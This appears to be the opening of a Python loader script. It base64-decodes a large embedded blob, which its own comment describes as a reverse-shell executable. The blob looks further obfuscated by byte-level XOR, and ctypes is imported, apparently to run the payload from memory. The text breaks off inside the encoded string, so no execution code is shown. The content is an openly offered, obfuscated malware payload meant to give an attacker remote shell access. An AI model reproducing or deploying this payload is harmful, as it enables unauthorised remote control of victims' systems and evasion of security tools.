import ctypes
import os
import base64
# read the executable file. It is a reverse shell in our case
binx = base64.b64decode('Y1lQWh4dHRwcHBwcHBwcHB8cIhwdHBwcXA4cHBwcHBxcHBwcHBwcHFwiHBwcHBwcHBwcHFwcJBwRHFwcAxwCHBocHBwYHBwcXBwcHBwcHBxcHBwcHBwcHFwcHBwcHBwcxB4cHBwcHBzEHhwcHBwcHBQcHBwcHBwcHxwcHBgcHBwEHxwcHBwcHAQfHBwcHBwcBB8cHBwcHBwAHBwcHBwcHAAcHBwcHBwcHRwcHBwcHBwdHBwcGBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHLQVHBwcHBwctBUcHBwcHBwcDBwcHBwcHB0cHBwZHBwcHAwcHBwcHBwcDBwcHBwcHBwMHBwcHBwcvRocHBwcHBy9GhwcHBwcHBwMHBwcHBwcHRwcHBgcHBwcPBwcHBwcHBw8HBwcHBwcHDwcHBwcHBwkHxwcHBwcHCQfHBwcHBwcHAwcHBwcHBwdHBwcGhwcHCwxHBwcHBwcLCEcHBwcHBwsIRwcHBwcHNQfHBwcHBwcvBgcHBwcHBwcDBwcHBwcHB4cHBwaHBwcXDEcHBwcHBxcIRwcHBwcHFwhHBwcHBwcHB4cHBwcHBwcHhwcHBwcHBQcHBwcHBwcGBwcHBgcHBwkHxwcHBwcHCQfHBwcHBwcJB8cHBwcHBw8HBwcHBwcHDwcHBwcHBwcFBwcHBwcHBwYHBwcGBwcHEQfHBwcHBwcRB8cHBwcHBxEHxwcHBwcHFgcHBwcHBwcWBwcHBwcHBwYHBwcHBwcHE/5aHgYHBwcJB8cHBwcHBwkHxwcHBwcHCQfHBwcHBwcPBwcHBwcHBw8HBwcHBwcHBQcHBwcHBwcTPloeBgcHBy4PRwcHBwcHLg9HBwcHBwcuD0cHBwcHBxIHBwcHBwcHEgcHBwcHBwcGBwcHBwcHBxN+Wh4GhwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwMHBwcHBwcHE75aHgYHBwcLDEcHBwcHBwsIRwcHBwcHCwhHBwcHBwczB4cHBwcHBzMHhwcHBwcHB0cHBwcHBwcM3B1fiooM3B4MXB1cmlkMWQkKjEqKDJvczIuHBwcHBwYHBwcDBwcHBkcHBxbUkkcHhwc3BgcHBwfHBwcHBwcHBgcHBwIHBwcHxwcHFtSSRzgilLjlOmVfhspxWtSIik2Fb1pyBgcHBwMHBwcHRwcHFtSSRwcHBwcHxwcHB4cHBwcHBwcHBwcHB4cHBwJHBwcHRwcHBocHBwcHJ0cHBwcHAkcHBwcHBwczXnScRwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBxIHBwcDhwcHBwcHBwcHBwcHBwcHBwcHBwNHBwcPBwcHBwcHBwcHBwcHBwcHBwcHBxuHBwcDhwcHBwcHBwcHBwcHBwcHBwcHByRHBwcDhwcHBwcHBwcHBwcHBwcHBwcHBxgHBwcDhwcHBwcHBwcHBwcHBwcHBwcHByFHBwcDhwcHBwcHBwcHBwcHBwcHBwcHBy7HBwcDhwcHBwcHBwcHBwcHBwcHBwcHBy8HBwcDhwcHBwcHBwcHBwcHBwcHBwcHBzIHBwcDhwcHBwcHBwcHBwcHBwcHBwcHBwZHRwcPBwcHBwcHBwcHBwcHBwcHBwcHByIHBwcDhwcHBwcHBwcHBwcHBwcHBwcHBz6HBwcDhwcHBwcHBwcHBwcHBwcHBwcHByyHBwcDhwcHBwcHBwcHBwcHBwcHBwcHByCHBwcDhwcHBwcHBwcHBwcHBwcHBwcHBypHBwcDhwcHBwcHBwcHBwcHBwcHBwcHByhHBwcDhwcHBwcHBwcHBwcHBwcHBwcHBx/HBwcDhwcHBwcHBwcHBwcHBwcHBwcHBxbHBwcDhwcHBwcHBwcHBwcHBwcHBwcHBwxHBwcPBwcHBwcHBwcHBwcHBwcHBwcHBxrHBwcDhwcHBwcHBwcHBwcHBwcHBwcHBzZHBwcPhwcHBwcHBwcHBwcHBwcHBwcHBwccHV+bGh0bnl9eDJvczIsHENVSFFDeHlueXt1b2h5bkhRX3BzcnlIfX5weRxDVUhRQ255e3VvaHluSFFfcHNyeUh9fnB5HGxodG55fXhDdnN1chxsaHRueX14Q39ueX1oeRxzbHlyHHB1fn8yb3MyKhxsaWhvHHpzbnccQ0NvaH1/d0N/dHdDen11cBx7eWhsdXgcd3VwcBxxcX1sHH1vbG51cmh6HG9lb2h5cRxsaG59f3kccX14anVveRxrfXVobHV4HENDf2R9Q3p1cn1wdWZ5HENDcHV+f0NvaH1uaENxfXVyHENDemRvaH1oHFtQVV5fQy4yKBxbUFVeX0MuMi4yKRxDQ3txc3JDb2h9bmhDQxwcHB4cHBwfHB8cGBwfHB8cHxwfHBwcHxwfHB8cHxwfHB8cHhweHBwcHxwfHB0cHhx0HBwcDBwcHCwcHBwIdXURHBwYHPMcHBwMHBwcaQZ1FRwcHxzlHBwcHBwcHB0cHRwdHBwcDBwcHBwcHBxpBnUVHBweHOUcHBwcHBwcLCEcHBwcHBwUHBwcHBwcHDwPHBwcHBwcJCEcHBwcHBwUHBwcHBwcHPwOHBwcHBwcFFwcHBwcHBwUHBwcHBwcHBRcHBwcHBwcxCMcHBwcHBwaHBwcHhwcHBwcHBwcHBwc/CMcHBwcHBwaHBwcFRwcHBwcHBwcHBwc9CMcHBwcHBwaHBwcFhwcHBwcHBwcHBwc7CMcHBwcHBwaHBwcDxwcHBwcHBwcHBwc5CMcHBwcHBwaHBwcCRwcHBwcHBwcHBwcRCMcHBwcHBwbHBwcHRwcHBwcHBwcHBwcfCMcHBwcHBwbHBwcHxwcHBwcHBwcHBwcdCMcHBwcHBwbHBwcGBwcHBwcHBwcHBwcbCMcHBwcHBwbHBwcGRwcHBwcHBwcHBwcZCMcHBwcHBwbHBwcGhwcHBwcHBwcHBwcnCMcHBwcHBwbHBwcGxwcHBwcHBwcHBwclCMcHBwcHBwbHBwcFBwcHBwcHBwcHBwcjCMcHBwcHBwbHBwcFxwcHBwcHBwcHBwchCMcHBwcHBwbHBwcEBwcHBwcHBwcHBwcvCMcHBwcHBwbHBwcERwcHBwcHBwcHBwctCMcHBwcHBwbHBwcEhwcHBwcHBwcHBwcrCMcHBwcHBwbHBwcExwcHBwcHBwcHBwcpCMcHBwcHBwbHBwcDBwcHBwcHBwcHBwc3CMcHBwcHBwbHBwcDRwcHBwcHBwcHBwc1CMcHBwcHBwbHBwcDhwcHBwcHBwcHBwczCMcHBwcHBwbHBwcCBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHO8TAuZUn/AUVJcZxTMcHFSZ3Gge48xUn9gU3xwcHBwc4yk+Mxwc7uM5PzMcHBMDHO8TAuZ0HBwcHO71/ePj44zvEwLmdB0cHBzu9c3j4+OM7xMC5nQeHBwc7vXd4+PjjO8TAuZ0HxwcHO71rePj44zvEwLmdBgcHBzu9b3j4+OM7xMC5nQZHBwc7vWN4+PjjO8TAuZ0GhwcHO71nePj44zvEwLmdBscHBzu9W3j4+OM7xMC5nQUHBwc7vV94+PjjO8TAuZ0FRwcHO71TePj44zvEwLmdBYcHBzu9V3j4+OM7xMC5nQXHBwc7vUt4+PjjO8TAuZ0EBwcHO71PePj44zvEwLmdBEcHBzu9Q3j4+OM7xMC5nQSHBwc7vUd4+PjjO8TAuZ0ExwcHO717eLj44zvEwLm7uM5oTIcHBMDWBwc7xMC5u7jOREyHBwTA1gcHO8TAubu4zkZMhwcEwNYHBzvEwLm7uM54TEcHBMDWBwc7xMC5u7jOekxHBwTA1gcHO8TAubu4znxMRwcEwNYHBzvEwLm7uM5+TEcHBMDWBwc7xMC5u7jOcExHBwTA1gcHO8TAubu4znJMRwcEwNYHBzvEwLm7uM50TEcHBMDWBwc7xMC5u7jOdkxHBwTA1gcHO8TAubu4zmhMRwcEwNYHBzvEwLm7uM5qTEcHBMDWBwc7xMC5u7jObExHBwTA1gcHO8TAubu4zm5MRwcEwNYHBzvEwLm7uM5gTEcHBMDWBwc7xMC5u7jOYkxHBwTA1gcHO8TAuYt8VWVzUJUlf5Un/jsTEhQkRkKGBwcVJERgx8cHFSRIT8dHBzjCW4xHBzojFSRIZ0yHBxUkRlmMhwcVCXkaAlUlxlSMRwcVJncaBXj/BMDnBwcHBzfEwOcHBwcHFSRIU0yHBxUkSlWMhwcVDXiVJXsVN3yI1Td5B9UHdpUzeJoCFSXGTkxHBxUmdxoFOP8ehMDWBwc3xMDnBwcHBzvEwLmnCEJMhwcHGk3SVSfIR4xHBwcVJX5aBBUlyEaMRwc9DXi4+P0eOPj49oZ8TEcHB1B3xMDHN8TA5wcHBwc7xMC5vVr4+Pj7xMC5klUlflUn/A8VJVh9NtZ4BwcHBzbWeQcHBwc9zxUlxl0MhwcphgcHByieBwcHFSV2/SS4uPjHVngn1nkHZ1h5OPd9xdiy5dZ4JXaVJEhlhAcHKQcHBwc9ATi4+OM1d/vEwLmSVSV+VSf8FyVYdBUlWnceFSXGDk0HBwcVJVZ5C3cVJEpcDAcHFSRIUEQHBykHBwcHPTH4ePjVJEhaBEcHPRj4ePjVJEpVDAcHFSRIZgRHBykHBwcHPSr4ePjVJFZ7FSRCTAwHBxUkSmfERwcVJXbpBwcHBz0xOHj41SXWexUldukHBwcHPRr4ePjohwcHBxUkSHnNxwcpBwcHBz0/eHj45UZZzEcHJcZaTEcHFSRKcIwHByV2/QrHhwclwl9MRwcVJcZ5jAcHFSf3BRdpRwcHBxdlcylHhwcHKYdHBwcVJXaoxwcHBz0GuHj41SVGSsxHBxUlxksMRwcVJXaVJEh5xAcHKQcHBwc9Bjh4+P0k+Hj45UZPTEcHJcZBzEcHJncE5jOHBwclxkRMRwcphwcHByiHBwcHJXb9Cjh4+PbWfQcHBwclxkHMBwclVnw21n8HBwcHPdk21n4HBwcHPd/21nAHBwcHPdRl1n4VIRUkQkhNxwcVB3MVJcMVJcRtDAcHJdZ+FSEVJEoHZcZtTAcHFSVzVSV7pXaoxgcHBykHBwcHPSG4OPjld6XWfQdzJVZ9J9ZwB2dYcATOxwcYrafWfgdl1n4J1nwYImfWfwdpAw7HByF62HwJVn8E5Bq4+Pjl1n0ldpUkSEAEBwcpBwcHBz0B+Dj4/dNpRwcHBxUkQmK4ePjohwcHBxUkSE9MBwc9IDn4+OjHBwcHKQcHBwc9AHg4+P0tOfj46IPHBwcldv08Ofj41SXGek3HByiHBwcHFSV2/RU4OPjpBwcHBxUl1HkeFQvEDk0HBwcaBn0Y+fj49XfejITA5gcHBwcHBMDHO8TAuZdS1CRIT87HBxdSlWVyl1JVZXpXUhdleBJVJExCDscHE9QNeFUn/AU9NPl4+NU3eEfaAMtxxMDnBwcHBxQle5QlfJYlftd4wjDVJ/fHVQlwWn2VJ/YFEdBXUBdQV1CXUPfenoyEwOYHBwcHBzvEwLm33oyEwOYHBwcHByM7xMC5lSV7pXiox0cHBz1Mefj4xzvEwLmVJ/wFFSf2BTfHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwdHB4cHBwcHHF9eGp1b3k8OXgWFhwcHBw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PBY8PDw0Q0NDNTw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8Fjw8PDRzPHM1Q0NDQ0MzPDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDwWPDw8PFxcPHw8PDw8PEA8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8Fjw8PDw8QDxDQ0NDMDwzOW88PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PBY8PDw8PDMzPDw8PDMzPDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8Fjw8PDxCQjw8PDxCQjw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDwWHFh1bmhlX3NrPG5zc2g8bG51anVweXt5PHlvf31wfWh1c3IcXn1/d3VyezxpbDw5bzxoczwzaHFsM359dxYcf2w8OW88M2hxbDN+fXcccXF9bDw5ZBYWHGxobn1/eTw5eBYWHBwdBx8nTBwcHBUcHBxg8uPjmBwcHJDz4+OwHBwcgPPj49gcHByA7OPjcBwcHJnt4+PAHBwc++3j4+AcHBxA6OPjAB0cHNDo4+N4HRwcwOjj42AdHBwIHBwcHBwcHB1mThwdZAwdBxAbFIwdHBwIHBwcABwcHDTs4+MzHBwcHFgbDBwcHBw4HBwcKBwcHOzx4+MMHRwcHBIMWhIEVhMXaxScHCMGJjYvOD4cHBwcCBwcHEAcHBzE8uPjDBwcHBwcHBwcHBwcCBwcHGgcHBzM8uPjHB0cHBwcHBwcHBwcABwcHJAcHBy97OPjfhwcHBxZEgyaHl8RGh5FEBsUHBwAHBwcsBwcHP/s4+N0HhwcHFkSDJoeXxEaH0MeEBsUHFgcHBzQHBwcJO/j43kcHBwcWhIMkx5VEgSSH1kSPJEYWRI0kBlYEiyaGlQSJJ8bWxJcchIkXRIsXRI0XhI8XhIEXhIMXhIUHAgcHBwIHRwcfO/j4xkcHBwcHBwcHBwcHAwcHBwwHRwcRO/j4w8cHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwc